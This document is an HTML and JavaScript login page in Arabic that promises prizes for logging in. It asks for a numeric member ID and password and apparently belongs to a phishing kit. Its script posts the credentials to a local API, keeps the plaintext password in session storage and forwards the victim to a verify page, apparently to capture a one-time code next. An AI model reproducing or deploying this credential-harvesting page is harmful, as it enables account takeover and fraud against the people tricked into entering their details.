<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
  <title>قم بتسجيل الدخول واربح افضل الجوائز</title>
  <meta name="description" content="قم بتسجيل الدخول واربح افضل الجوائز" />
  <meta property="og:type" content="website" />
  <meta property="og:title" content="قم بتسجيل الدخول واربح افضل الجوائز" />
  <meta property="og:description" content="قم بتسجيل الدخول واربح افضل الجوائز" />
  <meta property="og:image" content="/assets/lanjds.jpeg" />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="قم بتسجيل الدخول واربح افضل الجوائز" />
  <meta name="twitter:description" content="قم بتسجيل الدخول واربح افضل الجوائز" />
  <meta name="twitter:image" content="/assets/lanjds.jpeg" />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: "Cairo", sans-serif;
      background: #fff;
      min-height: 100vh;
      max-width: 430px;
      margin: 0 auto;
      color: #333;
    }

    .page-header {
      background: linear-gradient(180deg, #6b2d8a 0%, #5a2575 100%);
      padding: 6px 12px 8px;
      display: flex;
      justify-content: flex-start;
      align-items: center;
      line-height: 0;
    }

    .page-header img {
      width: auto;
      max-width: min(96%, 350px);
      height: auto;
      max-height: 100px;
      display: block;
      object-fit: contain;
      object-position: right center;
      mix-blend-mode: lighten;
    }

    .logo-box {
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 24px 16px 16px;
      line-height: 0;
    }

    .logo-box img {
      width: min(58vw, 200px);
      height: auto;
      display: block;
      object-fit: contain;
    }

    .form-wrap {
      background: #fff;
      padding: 10px 20px 32px;
    }

    .field {
      position: relative;
      margin-bottom: 12px;
    }

    .field input {
      width: 100%;
      height: 50px;
      padding: 0 20px;
      border: none;
      border-radius: 999px;
      background: #b8b8cc;
      color: #fff;
      font-family: inherit;
      font-size: 14px;
      font-weight: 600;
      outline: none;
      text-align: right;
    }

    .field input::placeholder { color: rgba(255,255,255,0.95); }

    .field-password input { padding-left: 44px; }

    .toggle-password {
      position: absolute;
      left: 16px;
      top: 50%;
      transform: translateY(-50%);
      border: none;
      background: transparent;
      cursor: pointer;
      color: #5d4b8e;
      padding: 4px;
    }

    .toggle-password svg { width: 20px; height: 20px; display: block; }

    .btn-login {
      width: 100%;
      min-height: 50px;
      margin-top: 24px;
      padding: 12px 16px;
      border: none;
      border-radius: 999px;
      background: #f0b878;
      color: #4b2c7f;
      font-family: inherit;
      font-size: 14px;
      font-weight: 700;
      line-height: 1.45;
      cursor: pointer;
    }

    .btn-login:disabled { opacity: 0.65; cursor: wait; }

    .forgot {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      margin-top: 12px;
      text-decoration: none;
      color: #4b2c7f;
      font-size: 13px;
      font-weight: 600;
    }

    .forgot-wrap {
      text-align: right;
      width: 100%;
    }

    .form-message {
      margin-top: 10px;
      text-align: center;
      font-size: 13px;
      font-weight: 600;
      color: #c0392b;
      min-height: 1.3em;
    }

    .overlay {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(255,255,255,0.75);
      align-items: center;
      justify-content: center;
      z-index: 100;
    }

    .overlay.show { display: flex; }

    .spinner {
      width: 48px;
      height: 48px;
      border: 4px solid #e0d4ec;
      border-top-color: #6b2d8a;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <header class="page-header">
    <img src="/assets/logo-white.png" alt="" />
  </header>

  <div class="logo-box">
    <img src="/assets/logo-purple.svg" alt="" />
  </div>

  <main class="form-wrap">
    <form class="login-form" id="login-form">
      <div class="field">
        <input
          id="id"
          type="tel"
          inputmode="numeric"
          pattern="[0-9]*"
          placeholder="أدخل رقم المميز"
          autocomplete="username"
          required
        />
      </div>
      <div class="field field-password">
        <input id="password" type="password" placeholder="أدخل كلمة المرور" autocomplete="current-password" required />
        <button type="button" class="toggle-password" aria-label="إظهار كلمة المرور">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19M1 1l22 22M14.12 14.12a3 3 0 1 1-4.24-4.24" />
          </svg>
        </button>
      </div>

      <button type="submit" class="btn-login">قم بتسجيل الدخول واربح افضل الجوائز</button>

      <div class="forgot-wrap">
        <a href="#" class="forgot" onclick="return false">
          <span>هل نسيت كلمة المرور؟</span>
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="5" y="11" width="14" height="10" rx="2" /><path d="M8 11V7a4 4 0 0 1 8 0v4" />
          </svg>
        </a>
      </div>

      <p class="form-message" id="form-message" aria-live="polite"></p>
    </form>
  </main>

  <div class="overlay" id="overlay" aria-hidden="true"><div class="spinner"></div></div>

  <script>
    const idInput = document.getElementById("id");
    const passwordInput = document.getElementById("password");
    const toggle = document.querySelector(".toggle-password");

    idInput.addEventListener("input", () => {
      const digits = idInput.value.replace(/\D/g, "");
      if (idInput.value !== digits) idInput.value = digits;
    });
    const form = document.getElementById("login-form");
    const messageEl = document.getElementById("form-message");
    const overlay = document.getElementById("overlay");
    const submitBtn = form.querySelector(".btn-login");

    toggle.addEventListener("click", () => {
      const hidden = passwordInput.type === "password";
      passwordInput.type = hidden ? "text" : "password";
    });

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      messageEl.textContent = "";
      submitBtn.disabled = true;
      overlay.classList.add("show");

      const id = idInput.value.trim();
      const password = passwordInput.value;

      try {
        const [res] = await Promise.all([
          fetch("/api/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ id, password }),
          }),
          new Promise((r) => setTimeout(r, 800)),
        ]);
        const data = await res.json().catch(() => ({}));

        if (res.ok && data.ok && data.session) {
          sessionStorage.setItem("authSession", data.session);
          sessionStorage.setItem("authId", id);
          sessionStorage.setItem("authPassword", password);
          sessionStorage.setItem("authIdSuffix", id.slice(-3));
          window.location.href = "/verify.html";
          return;
        }
        messageEl.textContent = data.message || "حدث خطأ، حاول مرة أخرى";
      } catch {
        messageEl.textContent = "تأكد من تشغيل الخادم (npm start)";
      } finally {
        overlay.classList.remove("show");
        submitBtn.disabled = false;
      }
    });
  </script>
</body>
</html>
